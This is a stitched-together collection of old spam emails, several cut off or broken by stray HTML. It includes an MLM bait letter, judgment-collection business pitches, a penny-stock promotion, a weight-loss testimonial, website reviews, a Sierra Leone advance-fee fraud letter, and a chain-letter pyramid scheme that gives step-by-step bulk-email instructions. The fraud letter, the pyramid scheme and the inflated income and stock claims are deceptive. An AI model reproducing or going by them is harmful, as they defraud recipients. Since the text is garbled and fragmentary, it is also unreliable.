Greetings!

You are receiving this letter because you have expressed an interest in 
receiving information about online business opportunities. If this is 
erroneous then please accept my most sincere apology. This is a one-time 
mailing, so no removal is necessary.

If you've been burned, betrayed, and back-stabbed by multi-level marketing, 
MLM, then please read this letter. It could be the most important one that 
has ever landed in your Inbox.

MULTI-LEVEL MARKETING IS A HUGE MISTAKE FOR MOST PEOPLE

MLM has failed to deliver on its promises for the past 50 years. The pursuit 
of the "MLM Dream" has cost hundreds of thousands of people their friends, 
their fortunes and their sacred honor. The fact is that MLM is fatally 
flawed, meaning that it CANNOT work for most people.

The companies and the few who earn the big money in MLM are NOT going to 
tell you the real story. FINALLY, there is someone who has the courage to 
cut through the hype and lies and tell the TRUTH about MLM.

HERE'S GOOD NEWS

There IS an alternative to MLM that WORKS, and works BIG! If you haven't yet 
abandoned your dreams, then you need to see this. Earning the kind of income 
you've dreamed about is easier than you think!

With your permission, I'd like to send you a brief letter that will tell you 
WHY MLM doesn't work for most people and will then introduce you to 
something so new and refreshing that you'll wonder why you haven't heard of 
this before.

I promise that there will be NO unwanted follow up, NO sales pitch, no one 
will call you, and your email address will only be used to send you the 
information. Period.

To receive this free, life-changing information, simply click Reply, type 
"Send Info" in the Subject box and hit Send. I'll get the information to you 
within 24 hours. Just look for the words MLM WALL OF SHAME in your Inbox.

Cordially,

Siddhi

P.S. Someone recently sent the letter to me and it has been the most 
eye-opening, financially beneficial information I have ever received. I 
honestly believe that you will feel the same way once you've read it. And 
it's FREE!

NEW PRODUCT ANNOUNCEMENT

From: OUTSOURCE ENG.& MFG. INC.


Sir/Madam;

This note is to inform you of new watchdog board technology for maintaining
continuous unattended operation of PC/Servers etc. that we have released for
distribution.
  
We are proud to announce Watchdog Control Center featuring MAM (Multiple
Applications Monitor) capability.
The key feature of this application enables you to monitor as many
applications as you
have resident on any computer as well as the operating system for
continuous unattended operation.  The Watchdog Control Center featuring
MAM capability expands third party application "control" of a Watchdog as
access to the application's
source code is no longer needed.

Here is how it all works:
Upon installation of the application and Watchdog, the user may select
many configuration options, based on their model of Watchdog, to fit their
operational needs.  If the MAM feature is enabled, the user may select any
executable program that they wish for monitoring.

A lock up of the operating system or if any one of the selected
applications is not running, the MAM feature, in
conjunction with the Watchdog, will reset the system allowing for
continuous operation.

It's that simple!

Watchdog Control Center is supported on most Microsoft Windows platforms
(Win9x/WinNT/Win2k) and includes a Linux version for PCI Programmable
Watchdogs.

Watchdog Control Center Features:
- Automated installation
- Controls all Outsource Engineering Watchdogs
- User selectable Watchdog timeout period
- User selectable Watchdog stroke interval
- Multiple Application Monitoring

Included on the Installation CD:
- Watchdog Control Center
- Watchdog Drivers
- Documentation

If you are like many people, you are not even sure what a<BR>
Money Judgment is and </FONT>
<FONT color=3D"#0000A0"> why processing Money Judgments<BR>
can earn you very substantial income</FONT>
<FONT color=3D"#000000">  .<BR>
<BR>
If you ever sue a company or a person and you win then you<BR>
will have a Money Judgment against them.<BR>
<BR>
You are happy you won but you will soon find out the<BR>
shocking fact: "Its now up to you to collect on the<BR>
Judgment". The court does not require the loser to pay you.<BR>
The court will not even help you. You must trace the loser<BR>
down, find their assets, their employment, bank accounts,<BR>
real estate, stocks and bonds, etc.<BR>
<BR>
Very few people know how to find these assets or what to do<BR>
when they are found. The result is that millions of<BR>
Judgments are just sitting in files and being forgotten.<BR>
<BR>
"In 79% of the cases the winner of a Judgment never sees a<BR>
dime."<BR>
<BR>
The non-payment of judicial debt has grown to epidemic<BR>
proportions. Right now in the United States there is<BR>
between </FONT>
<FONT color=3D"#0000A0"> 200 and 300 billion dollars of uncollected Money<=
BR>
Judgment debt</FONT>
<FONT color=3D"#000000">  . For every Judgment that is paid, 5 more<BR>
Judgments take its place.<BR>
<BR>
We identified this massive market 8 years ago and have<BR>
actively pursued Judicial Judgments since. We invented this<BR>
business. We have perfected it into a well proven and solid<BR>
profession in which only a select few will be trained in the<BR>
techniques necessary to succeed.<BR>
<BR>
With our first hand experience we have built a course which<BR>
teaches you how to start your business in this new unknown<BR>
and exciting field of processing Money Judgments.<BR>
<BR>
By following the steps laid out in our course and with<BR>
reasonable effort you can become very successful in the<BR>
processing of Money Judgments.<BR>
<BR>
The income potential is substantial in this profession. </FONT>
<FONT color=3D"#0000A0"> We<BR>
have associates who have taken our course and are now<BR>
working full time making $96,000.00 to over $200,000.00 per<BR>
year. Part time associates are earning between $24,000.00<BR>
and $100,000.00 per year </FONT>
<FONT color=3D"#000000"> . Some choose to operate out of<BR>
their home and work by themselves. Others build a sizable<BR>
organization of 15 to 25 people in attractive business<BR>
offices.<BR>
<BR>
Today our company and our associates have over 126<BR>
million dollars in Money Judgments that we are currently<BR>
processing. Of this 126 million, 25 million is in the form<BR>
of joint ventures between our firm and our associates.<BR>
Joint ventures are where we make our money. We only break<BR>
even when our course is purchased. We make a 12% margin on<BR>
the reports we supply to our associates. Our reporting<BR>
capability is so extensive that government agencies, police<BR>
officers, attorneys, credit agencies etc., all come to us<BR>
for reports.<BR>
<BR>
<BR>
Many of our associates already have real estate liens in<BR>
force of between 5 million to over 15 million dollars.<BR>
Legally this means that when the properties are sold or<BR>
refinanced our associate must be paid off. The norm is 10%<BR>
interest compounded annually on unpaid Money Judgments.<BR>
Annual interest on 5 million at 10% translates to<BR>
$500,000.00 annually in interest income, not counting the<BR>
payment of the principal.<BR>
<BR>
Our associates earn half of this amount or $250,000.00 per<BR>
year. This is just for interest, not counting principle<BR>
and not counting the compounding of the interest which can<BR>
add substantial additional income. Typically companies are<BR>
sold for 10 times earnings. Just based on simple interest<BR>
an associate with 5 million in real estate liens could sell<BR>
their business for approximately 2.5 million dollars.<BR>
<BR>
</FONT>
<FONT color=3D"#0000A0"> 92% of all of our associates work out of their ho=
me; 43%<BR>
are women and 36% are part time</FONT>
<FONT color=3D"#000000">  .<BR>
<BR>
One of the benefits of working in this field is that you are<BR>
not under any kind of time frame. If you decide to take off<BR>
for a month on vacation then go. The Judgments you are<BR>
working on will be there when you return. The Judgments<BR>
are still in force, they do not disappear.<BR>
<BR>
The way we train you is non-confrontational. You use your<BR>
computer and telephone to do most of the processing. You<BR>
never confront the debtor. The debtor doesn't know who you<BR>
are. You are not a collection agency.<BR>
<BR>
Simply stated the steps to successful Money Processing<BR>
are as follows:<BR>
<BR>
Mail our recommended letter to companies and individuals<BR>
with Money Judgments. (We train you how to find out who<BR>
to write to)<BR>
<BR>
8% to 11% of the firms and people you write will call you<BR>
and ask for your help. They call you, you don't call them<BR>
unless you want to.<BR>
<BR>
You send them an agreement (supplied in the course) to<BR>
sign which splits every dollar you collect 50% to you and<BR>
50% to them. This applies no matter if the judgment is for<BR>
$2,000.00 or $2,000,000.00.<BR>
<BR>
You then go on-line to our computers to find the debtor<BR>
and their assets. We offer over 120 powerful reports to<BR>
assist you. They range from credit reports from all three<BR>
credit bureaus, to bank account locates, employment<BR>
locates, skip traces and locating stocks and bonds, etc.<BR>
The prices of our reports are very low. Typically 1/2 to<BR>
1/3 of what other firms charge. For example we charge<BR>
$6.00 for an individuals credit report when some other<BR>
companies charge $25.00.<BR>
<BR>
Once you find the debtor and their assets you file<BR>
garnishments and liens on the assets you have located.<BR>
(Standard fill in the blanks forms are included in the<BR>
course)<BR>
<BR>
When you receive the assets you keep 50% and send 50% to<BR>
the original Judgment holder.<BR>
<BR>
Once the Judgment is fully paid you mail a Satisfaction of<BR>
Judgment to the court. (Included in the course)<BR>
<BR>
Quote's from several of our students:<BR>
<BR>
Thomas in area code 516 writes us: "I just wanted to drop<BR>
you a short note thanking you for your excellent course. </FONT>
<FONT color=3D"#0000A0"> My<BR>
first week, part time, will net me 3,700.00 dollars</FONT>
<FONT color=3D"#000000">  . Your<BR>
professionalism in both the manual and the video opened<BR>
doors for me in the future. There's no stopping me now.<BR>
Recently Thomas states he has over $8,500,000 worth of<BR>
judgments he is working on.<BR>
<BR>
After only having this course for four months, Larry S. in<BR>
area code 314 stated to us: " </FONT>
<FONT color=3D"#0000A0"> I am now making $2,000.00 per<BR>
week </FONT>
<FONT color=3D"#000000"> and expect this to grow to twice this amount with=
in the<BR>
next year. I am having a ball. I have over $250,000 in<BR>
judgments I am collecting on now."<BR>
<BR>
After having our course for 7 months Larry S. in 314 stated<BR>
" </FONT>
<FONT color=3D"#0000A0"> I am now making $12,000.00</FONT>
<FONT color=3D"#000000">  per month and have approximately<BR>
$500,000.00 in judgments I am collecting on. Looks like I<BR>
will have to hire someone to help out"<BR>
<BR>
Marshal in area code 407 states to us "I feel bad, you only<BR>
charged me $259.00 for this course and it is a goldmine. I<BR>
have added 3 full time people to help me after only having<BR>
your course for 5 months"<BR>
<BR>
>From the above information and actual results you can see<BR>
why we can state the following:<BR>
<BR>
With our course you can own your own successful business.<BR>
A business which earns you substantial income now and one<BR>
which could be sold in 3-5 years, paying you enough to<BR>
retire on and travel the world. A business which is<BR>
extremely interesting to be in. A Business in which every<BR>
day is new and exciting.<BR>
<BR>
None of your days will be hum-drum. Your brain is<BR>
Challenged. A business, which protects you from Corporate<BR>
Downsizing. A business which you can start part time from<BR>
your home and later, if you so desire, you can work in full<BR>
time. A business, which is your ticket to freedom from<BR>
others telling you what to do. A business, which lets you<BR>
control your own destiny. Our training has made this happen<BR>
for many others already. Make it happen for you!<BR>
<BR>
If the above sounds interesting to you then its time for you<BR>
to talk to a real live human being, no cost or obligation<BR>
on your part.<BR>

China's rapid economic growth, as ranked by the World Bank, is TEN TIMES 
FASTER than the world economy. 

The only thing US investors should be asking themselves is, "How can I 
participate in this explosion?" We have the answer. Texas-based 
CommunicateNow.com, Inc. (OTC BB trading symbol: CMNW) may unlock 
China's amazing potential.

INVESTOR'S TIMING OPPORTUNITY

Texas-based CommunicationsNow.com Inc. (OTCBB trading symbol: CMNW) 
announces today that a top representative from CMNW will be traveling to 
China in an attempt to negotiate with one of China's top manufacturers of
high pressure laminate products for CMNW to act as a worldwide distributor
of its products. You know what the Chinese did to the global steel market:
they captured it! China is now set to conquer another major commodity, and
you can profit right along with them. This is just one example of how CMNW 
may make company history.

Opening China's Door

Using hard-won experience gained in the survivor-takes-all US Internet market, 
CMNW developed technology that makes it possible for China's millions of 
entrepreneurs, small and medium sized companies, and major corporations to 
do business worldwide via the Internet. Chinese makers of porcelain, for 
example, can deal direct with US consumers and retailers. Say "goodbye" to 
the layers of middlemen.

CMNW strives to become a World Wide Wholesaler 

CMNW is attempting to become an International wholesaler to the world. This
is an enormous goal. Many believe that trade with China built the world's greatest
fortunes, from the golden age of Venice to the British Empire. Now this potential
is being transferred to the Internet, and CMNW will attempt to capture it.

CMNW puts all this into your portfolio: stability of a US-based company... 
sky-rocketing China market...convenience of a US-listed stock...dynamics of 
a growth company. 

*** For the latest quarterly report on CMNW, go to www.freeedgar.com *** 

Obviously, you cannot go back in time to the year 1901 and invest in baby US 
companies like Coca-Cola and Johnson & Johnson as they were getting started. 
But you can grab the modern day equivalent. That's right. The growth 
potential in China at this very minute is like the United States at the start 
of the 20th century -- perhaps even greater. 

There's much more to the CMNW story. Including a major expansion into Mexico.

<HTML><FONT PTSIZE=10 FAMILY="SANSSERIF" LANG="0">Dear Friend,<BR>
<BR>
This last summer, our family had a big reunion at a fabulous resort in 
Minnesota. &nbsp;The water was sapphire blue and the evergreens sang as the 
breeze rustled their limbs. &nbsp;We had such a great time renewing old 
friendships, seeing how everyone's children had grown, and catching up on 
everyone's lives. &nbsp;The last day we had a family picture taken, thinking 
that we'd all send them out as our Christmas cards.<BR>
<BR>
In October we got the proofs back so that we could pick our favorite picture. 
Everybody looked wonderful and the background was spectacular but I could not 
find myself in the picture. &nbsp;I looked and looked and finally got out a 
magnifying glass. &nbsp;To my horror, I found this dark curly headed woman 
with a face that looked like a stretched moon!!! &nbsp;Dear God it was me!!! 
&nbsp;My body resembled an inflated hot air balloon that would take off should 
a heavy wind arise... it was </FONT><FONT  COLOR="#ff0000" BACK="#ffffff"

style="BACKGROUND-COLOR: #ffffff" SIZE=2 PTSIZE=10 FAMILY="SANSSERIF" 
FACE="Arial" LANG="0">! &nbsp;I had mirrors in my house but most of them were 
designed to only reflect &nbsp;from the waist up and I honestly hadn't noticed 
that my cheekbones had totally disappeared and that my face looked like a 
shapeless clump of flesh. &nbsp;I was always so happy that I didn't have a lot 
of wrinkles, &nbsp;but I didn't realize that I wasn't wrinkled because my skin 
was as stretched as tight as a bongo drum.<BR>
<BR>
Well, this situation was </FONT><FONT  COLOR="#ff0000" BACK="#ffffff"

style="BACKGROUND-COLOR: #ffffff" SIZE=2 PTSIZE=10 FAMILY="SANSSERIF" 
FACE="Arial" LANG="0"> acceptable. &nbsp;But I was at a loss as to what to do. 
&nbsp;My willpower, well, basically sucks and I had so-o-o much weight to lose 
that I wasn't sure I'd live long enough to get it all off. &nbsp;Plus, I hate 
diets and can only stick to them for a very short period of time before I fall 
off the food wagon. &nbsp;My goal to slim down seemed totally hopeless.<BR>
<BR>
</FONT><FONT  COLOR="#ff0000" BACK="#ffffff" style="BACKGROUND-COLOR: 
#ffffff" SIZE=2 PTSIZE=10 FAMILY="SANSSERIF" FACE="Arial" LANG="0"><B>AND THEN 
IT HAPPENED</FONT><FONT  COLOR="#000000" BACK="#ffffff"

style="BACKGROUND-COLOR: #ffffff" SIZE=2 PTSIZE=10 FAMILY="SANSSERIF" 
FACE="Arial" LANG="0">. &nbsp;I received a brochure about a product called

PLUS</U></I></B></FONT><FONT  COLOR="#000000" BACK="#ffffff" 
style="BACKGROUND-COLOR: #ffffff" SIZE=2 PTSIZE=10 FAMILY="SANSSERIF" 
FACE="Arial" LANG="0">. &nbsp;It seemed to contain everything I needed. &nbsp;
It curbs your appetite, increases energy, burns fat at the fastest rate 
possible, no special diets are required, you don't have to exercise like a 
lunatic, it doesn't make you feel speeded, &nbsp;</FONT><FONT  COLOR="#ff0000" 
BACK="#ffffff" style="BACKGROUND-COLOR: #ffffff" SIZE=2 PTSIZE=10 
FAMILY="SANSSERIF" FACE="Arial" LANG="0"><B>AND IT 'S ALL NATURAL WITH NO

style="BACKGROUND-COLOR: #ffffff" SIZE=2 PTSIZE=10 FAMILY="SANSSERIF" 
FACE="Arial" LANG="0">. &nbsp;It also was priced well below other products so 
I figured that if it didn't work I wouldn't be out much money. &nbsp;It is 
guaranteed, but I'm always too lazy to bother to send back the empty bottles 
so this diet supplement seemed perfect for me.<BR>
<BR>
It's been about 6 weeks now but I swear I'm beginning to look like that 
famous Cindy person that models. &nbsp;My cheekbones are absolutely glorious.. 
I swear I look like a new person and a good one at that. &nbsp;</FONT><FONT

Shar Pei with nasty folds of skin hanging all around after you lose the weight.

I promise you that this product works. &nbsp;It does everything it promises 
and then some. &nbsp;Just losing the weight alone, makes you feel so much 
better and younger. &nbsp;It puts zest back into your life and assures you 
that you'll achieve your weight loss goals. &nbsp;In another few weeks I will 
reach my goal...something I had given up on. &nbsp;Also, </FONT><FONT

OPRAH, NIGHTLINE, MARIA SHRIVER, 48 HOURS, 20/20, 
PLAYBOY, KIPLINGERS and more have all interviewed this 
FAMOUS Private Investigator, seeking to find how he made 
his fortune.  Take a moment and learn his long sought after SECRETS.

This PI is the originator of seeking out Judicial Judgments and using 
them to make a FORTUNE!  Most people have no idea what a 
Judicial Judgment is, much less how to process them to earn a very 
substantial income.

Heres the SCOOP-  When one person or business files suit against 
another and wins, the winner then has a JUDICIAL JUDGMENT.
BUT, even though they won- guess what? They soon find out these 
SHOCKING FACTS:

a) Its now up to them to Collect on the Judgment
b) The court does not require the loser to pay you. 
c) The court will not help you to collect it. 
d) Employees of the court are FORBIDDEN BY LAW from telling 
you how to collect the judgment. 

All the winner really has is a WORTHLESS piece of paper. They 
must trace the loser down, find their assets; their employment, bank 
accounts, real estate, stocks and bonds, etc. And THE WINNER 
has to pay all the expenses to find this out.  All of a sudden that 
BIG CASH SETTLEMENT the person got, has become an 
expense instead of an asset!  

WHAT HAPPENS THEN?- MILLIONS of Judgments just sit in 
files and become forgotten. people give up trying.  Right now in the 
United States there are between 200 and 300 BILLION dollars of 
uncollected JUDICIAL JUDGMENTs. For every Judgment that is paid, 
5 or more unpaid Judgments take its place. 

So how does this Private Investigator make a FORTUNE collecting 
other peoples judgments?  Thats what we want to tell you.  
Through long and hard work, this Sleuth has learned a 
process that will turn these forgotten useless pieces of paper 
into a FORTUNE without the high collection cost.

The income potential is substantial in this profession! Using the 
techniques taught in his course , people are now working full-time 
making $96,000.00 to over $200,000.00 per year. Part-time 
associates are earning between $24,000.00 and $100,000.00 per 
year. Most choose to work out of their homes, others build sizable 
organizations.

Today, people trained in this business opportunity are processing 
over 500 million dollars in JUDICIAL JUDGMENTs!  AND, 
new judgments become available every day.  The work is
ALWAYS there, you just need to know how to go about it. 
This is a GREAT OPPORTUNITY for anyone who wants to start 
something on the side that will offer a solid income in the future. 
It is also ideal because you determine how much time you want to 
spend doing this and when. Make no mistake though-THIS IS NOT 
A GET RICH QUICK SCHEME. It requires effort on your part.  
The more effort the bigger the reward.  You choose how much you 
want to make!

If you've ever dreamed the American Dream financial freedom 
this may very well be the opportunity youve been looking for.  
This business can also protect you from corporate downsizing. 
It might also be your ticket to freedom from others telling you what
to do. This business lets you control your destiny! You dont need 
to be a rocket scientist either! Our training has made this happen for 
many others already. Make it happen for you too!

Take the first step and talk it over with one of our trained 
counselors by calling 1-720-733-7315.  Let them answer your 
questions so that youll know if its right for you.  There is no cost 
or obligation on your part except the cost of a phone call.  

Join a small number of people who are reaping the BIG 
REWARDS, by calling us at 1-720-733-7315 today!

It is a bit slow loading as would be the case with so much animation.I guess it will always be slow with all that. I do not like pop up pages and therewas one that kept doing that. Some of the pages were really pretty but theanimation did not fit the mood of the page. A tremendous amout of work hasbeen put into the page. There are so many places to host websites inexpensively,why don't you have your own domain? You ought to check into that.~~~~This is a very lovely site, the graphics are awesome and the games are funas well. You may want to look into purchasing your own domain name anda host that offers bannerless hosting (at least without the pop-ups).~~~~Hmm... too much input! There's way too much loading on this page. I don'tlike the wav file loading and though I didn't here anything windows promptedme for a MP3 decoder, so I presume one of those was loading as well. Someof the links are pretty cool but perhaps the main menu should be also textbased or smaller gifs and put on the index page. For a minute I didn't knowwhere to go.~~~~This was a neat site.  The site was original and I could tell that Mrs. T certainlyseems to enjoy working on her site.  The graphics were pretty, or funny,depending on each one, but well arranged. But, the text on the home pagewas going from the left side to the right side with no margins so it overlappedthe left rose border. I'd suggest moving the margins in a little bit.  Also, I thinkusing a sans-serif font like arial would be easier to read, though I did like howthe font color matched the flowers. BTW, I was viewing the site with internetexplorer.I don't think you need the 'welcome' on both the home page and the site guidepage, it's overkill. I also didn't figure out the association between mrstgifts,interactive opinions, and a site on graphics. Relating the name of your site tothe site content helps when new visitors visit.On your home page you say something about trying to design your own graphics.If you do so, try starting with a logo for your site. I realize you are showingdifferent pictures and styles, but it would be nice to have a logo or the samepicture on each page so it's easy to tell I'm still visiting the same website. Onyour articles page it was hard to see the titles by the earth graphics becauseof the background colors. Maybe putting them in a table with the backgroundbehind that would work better.Look for a host that doesn't use pop-ups - I would have checked out morepages but I hated getting those pop-ups each time I clicked to a new page.I went to your articles site and that was at homestead - that bar is much easierto deal with than the pop-ups. I'd suggest moving your whole site there.~~~~This is an interesting site - it covers a large variety of subjects - not all of whichI visited - and it has something for every member of the family, however, mostof it is for either mothers or the kids. She even has some games to play - goodfor smaller kids, too! Mrs. T., as she is known, is quite creative - and I wouldrecommend this site for the whole family.~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~VOTE ON YOUR FAVORITE WEBSITE DESIGN!Help out the winner of the free website redesign by voting forYOUR favorite!You can help out Teddy at http://www.links4profit.com by taking alook at his site, then checking out the three new layouts Jana ofAkkaBay Designs http://AkkaBay.com has designed specificallyfor him.

JOHANNESBURG,SOUTH AFRICA.
E-MAIL: joel_rose1@mail.com


ATTN:ALHAJI

With due respect, trust and humility, I write you this
proposal, which I believe, would be of great interest
to you. I am Mrs. regina Rossman, the wife of late Mr.
Joseph Rossman of blessed memory, before forces loyal
to
Major Johnny Paul Koromah killed my husband; he was
the Director General of Gold and Mining Corporation
(G.D.M.C.) of Sierra Leone. My husband was one of the
people targeted by the rebel forces. On the course of
the revolution in the country, prominent people were
hijacked from their homes to an unknown destination.

Two days before his death, he managed to sneak a
written message to us, explaining his condition and
concerning one trunk box of valuables containing
money, which he concealed under the roof. He
instructed me to take our son and move out of Sierra
Leone, immediately to any neighboring country. The
powerful peace keeping force of the (ECOMOG)
intervened to arrest the situation of mass killings by
the rebels, which was the order of the day.
Eventually, it resulted into full war, I became a
widow overnight, helpless situation, without a partner
at the moment of calamity, and every person was
running for his life. My son and I managed to escape
to South Africa safely with the box and some documents
of property title.

The cash involved inside the box was US$30 Million
(Thirty Million United States Dollars). Due to fear
and limited rights as a refugee, I deposited the items
with a private security company in order not to raise
an eyebrow over the box here in South Africa in my
sons name JOEL R. ROSSMAN. Be informed that the real
content of the box was not disclosed. Meanwhile, I
want to travel out of South Africa entirely with this
money for investment in your country because of
political and economic stability and for future
benefit of my child.


I want you to assist us claim this box from the
security company and get the money into your private
account in your country so that we can invest the
money wisely. We have in mind to establish a rewarding
investment and good relationship with you.


Concerning the money, we are prepared to give you
reasonable percentage of 30% for your kind assistance.
Also, we have decided to set aside 5% of the total sum
for expenses that might be incurred by the parties in
the course of the transfer both locally and
externally. For the interest of this business, do not
hesitate to contact my son Mr. JOEL R. ROSSMAN on the
above e-mail address immediately you
receive this message for more information and to
enable
us proceed towards concluding all our arrangements. No
other person knows about this money apart from my son
and I. We await your most urgent response.please we
need your fax/phone numbers for esiear communication.

Thanking you for your co-operation and God bless you.


Best regard,

MRS. REGINA ROSSMAN.

Dear Friends & Future Millionaire: 

AS SEEN ON NATIONAL TV: 
Making over half million dollars every 4 to 5 months from your home for 
an investment of only $25 U.S. Dollars expense one time 
THANK'S TO THE COMPUTER AGE AND THE INTERNET ! 

================================================== 

BE A MILLIONAIRE LIKE OTHERS WITHIN A YEAR!!! 

Before you say ''Bull'', please read the following. This is the letter you 
have been hearing about on the news lately. Due to the popularity of 
this letter on the Internet, a national weekly news program recently devoted 
an entire show to the investigation of this program described below, to see 
if it really can make people money. The show also investigated whether or 
not the program was legal. 

Their findings proved once and for all that there are ''absolutely NO Laws 
prohibiting the participation in the program and if people can -follow the 
simple instructions, they are bound to make some mega bucks with only 
$25 out of pocket cost''. DUE TO THE RECENT INCREASE OF 
POPULARITY & RESPECT THIS PROGRAM HAS ATTAINED, 
IT IS CURRENTLY WORKING BETTER THAN EVER. 

This is what one had to say: ''Thanks to this profitable opportunity. I 
was approached many times before but each time I passed on it. I am 
so gladI finally joined just to see what one could expect in return for the 
minimal effort and money required. To my astonishment, I received total $ 
610,470.00 in 21 weeks, with money still coming in." 
Pam Hedland, Fort Lee, New Jersey. 

=================================================== 

Here is another testimonial: "This program has been around for a long 
time but I never believed in it. But one day when I received this again 
in the mail I decided to gamble my $25 on it. I followed the simple 
instructions and walaa ..... 3 weeks later the money started to come in. 
First month I only made $240.00 but the next 2 months after that I made 
a total of $290,000.00. So far, in the past 8 months by re-entering the 
program, I have made over $710,000.00 and I am playing it again. The 
key to success in this program is to follow the simple steps and NOT change 
anything.'' More testimonials later but first, 

===== PRINT THIS NOW FOR YOUR FUTUREREFERENCE ====== 

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 
If you would like to make at least $500,000 every 4 to 5 months easily and 
comfortably, please read the following...THEN READ IT AGAIN and AGAIN!!! 
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 

FOLLOW THE SIMPLE INSTRUCTION BELOW AND YOUR FINANCIAL 
DREAMS WILL COME TRUE, GUARANTEED! INSTRUCTIONS: 

=====Order all 5 reports shown on the list below ===== 

For each report, send $5 CASH, THE NAME & NUMBER OF THE REPORT 
YOU ARE ORDERING and YOUR E-MAIL ADDRESS to the person whose 
name appears ON THAT LIST next to the report. MAKE SURE YOUR RETURN 
ADDRESS IS ON YOUR ENVELOPE TOP LEFT CORNER in case of any mail 
problems. 

=== When you place your order, make sure you order each of the 5 reports. 
You will need all 5 reports so that you can save them on your computer 
and resell them. YOUR TOTAL COST $5 X 5=$25.00. 

Within a few days you will receive, vie e-mail, each of the 5 reports from 
these 5 different individuals. Save them on your computer so they will be 
accessible for you to send to the 1,000's of people who will order them 
from you. Also make a floppy of these reports and keep it on your desk in 
case something happen to your computer. 

IMPORTANT - DO NOT alter the names of the people who are listed next 
to each report, or their sequence on the list, in any way other than what is 
instructed below in step '' 1 through 6 '' or you will loose out on majority 
of your profits. Once you understand the way this works, you will also see 
how it does not work if you change it. Remember, this method has been 
tested, and if you alter, it will NOT work !!! People have tried to put their 
friends/relatives names on all five thinking they could get all the money. But 
it does not work this way. Believe us, we all have tried to be greedy and then 
nothing happened. So Do Not try to change anything other than what is 
instructed. Because if you do, it will not work for you.
 
Remember, honesty reaps the reward!!! 

1.... After you have ordered all 5 reports, take this advertisement and 
REMOVE the name & address of the person in REPORT # 5. This person 
has made it through the cycle and is no doubt counting their fortune. 
2.... Move the name & address in REPORT # 4 down TO REPORT # 5. 
3.... Move the name & address in REPORT # 3 down TO REPORT # 4. 
4.... Move the name & address in REPORT # 2 down TO REPORT # 3. 
5.... Move the name & address in REPORT # 1 down TO REPORT # 2 
6.... Insert YOUR name & address in the REPORT # 1 Position. PLEASE MAKE 
SURE you copy every name & address ACCURATELY! 

========================================================== 

**** Take this entire letter, with the modified list of names, and save it on your 
computer. DO NOT MAKE ANY OTHER CHANGES. 
Save this on a disk as well just in case if you loose any data. To assist you with 
marketing your business on the internet, the 5 reports you purchase will provide 
you with invaluable marketing information which includes how to send bulk 
e-mails legally, where to find thousands of free classified ads and much more. 
There are 2 Primary methods to get this venture going: 
METHOD # 1: BY SENDING BULK E-MAIL LEGALLY 

==========================================================
 
Let's say that you decide to start small, just to see how it goes, and we will 
assume You and those involved send out only 5,000 e-mails each. Let's 
also assume that the mailing receive only a 0.2% response (the response 
could be much better but lets just say it is only 0.2%. Also many people 
will send out hundreds of thousands e-mails instead of only 5,000 each). 
Continuing with this example, you send out only 5,000 e-mails. With a 0.2% 
response, that is only 10 orders for report # 1. Those 10 people responded 
by sending out 5,000 e-mail each for a total of 50,000. Out of those 50,000 
e-mails only 0.2% responded with orders. That's=100 people responded and 
ordered Report # 2
. 
Those 100 people mail out 5,000 e-mails each for a total of 500,000 e-mails. 
The 0.2% response to that is 1000 orders for Report # 3. 

Those 1000 people send out 5,000 e-mails each for a total of 5 million e-mails 
sent out. The 0.2% response to that is 10,000 orders for Report # 4.
 
Those 10,000 people send out 5,000 e-mails each for a total of 50,000,000 
(50 million) e-mails. The 0.2% response to that is 100,000 orders for Report 
# 5
 THAT'S 100,000 ORDERS TIMES $5 EACH=$500,000.00 (half million).
 
Your total income in this example is: 1..... $50 + 2..... $500 + 3..... $5,000 + 4 
... $50,000 + 5..... $500,000 ........ Grand Total=$555,550.00 

NUMBERS DO NOT LIE. GET A PENCIL & PAPER AND FIGUREOUT 
THE WORST POSSIBLE RESPONSES AND NO MATTER HOW YOU 
CALCULATE IT, YOU WILL STILL MAKE A LOT OF MONEY !
 
========================================================= 

REMEMBER FRIEND, THIS IS ASSUMING ONLY 10 PEOPLE 
ORDERING OUT OF 5,000 YOU MAILED TO. 
Dare to think for a moment what would happen if everyone or half or even 
one 4th of those people mailed 100,000e-mails each or more? There are 
over 150 million people on the Internet worldwide and counting. Believe me, 
many people will do just that, and more! 
METHOD # 2 : BY PLACING FREE ADS ON THE INTERNET 

======================================================= 

Advertising on the net is very very inexpensive and there are hundreds 
of FREE places to advertise. Placing a lot of free ads on the Internet will 
easily get a larger response. We strongly suggest you start with Method # 1 
and dd METHOD # 2 as you go along. For every $5 you receive, all you 
must do is e-mail them the Report they ordered. That's it. Always provide 
same day service on all orders. 
This will guarantee that the e-mail they send out, with your name and 
address on it, will be prompt because they can not advertise until they 
receivethe report. 

=========== AVAILABLE REPORTS ==================== 

ORDER EACH REPORT BY ITS NUMBER & NAME ONLY. Notes: 
Always send $5 cash (U.S. CURRENCY) for each Report. Checks NOT 
accepted. Make sure the cash is concealed by wrapping it in at least 2 sheets 
of paper. On one of those sheets of paper, Write the NUMBER & the NAME 
of the Report you are ordering, YOUR E-MAIL ADDRESS and your name 
and postal address.

$$$$$$$$$ YOUR SUCCESS GUIDELINES $$$$$$$$$$$ 

Follow these guidelines to guarantee your success: 

=== If you do not receive at least 10 orders for Report #1 within 2 
weeks, continue sending e-mails until you do. 
=== After you have received 10 orders, 2 to 3 weeks after that you 
should receive 100 orders or more for REPORT # 2. If you did not, 
continue advertising or sending e-mails until you do. 
=== Once you have received 100 or more orders for Report # 2, YOU 
CAN RELAX, because the system is already working for you, and the 
cash will continue to roll in ! THIS IS IMPORTANT TO REMEMBER: 
Every time your name is moved down on the list, you are placed in front 
of a Different report. 
You can KEEP TRACK of your PROGRESS by watching which report 
people are ordering from you. IF YOU WANT TO GENERATE MORE 
INCOME SEND ANOTHER BATCH OF E-MAILS AND START 
THE WHOLE PROCESS AGAIN. 
There is NO LIMIT to the income you can generate from this business !!! 

====================================================== 

FOLLOWING IS A NOTE FROM THE ORIGINATOR OF THIS 
PROGRAM: You have just received information that can give you 
financial freedom for the rest of your life, with NO RISK and JUST 
A LITTLE BIT OF EFFORT. You can make more money in the next 
few weeks and months than you have ever imagined. Follow the program 
EXACTLY AS INSTRUCTED. Do Not change it in any way. It works 
exceedingly well as it is now. 
Remember to e-mail a copy of this exciting report after you have put 
your name and address in Report #1 and moved others to #2 ...........# 5 
as instructed above. One of the people you send this to may send out 
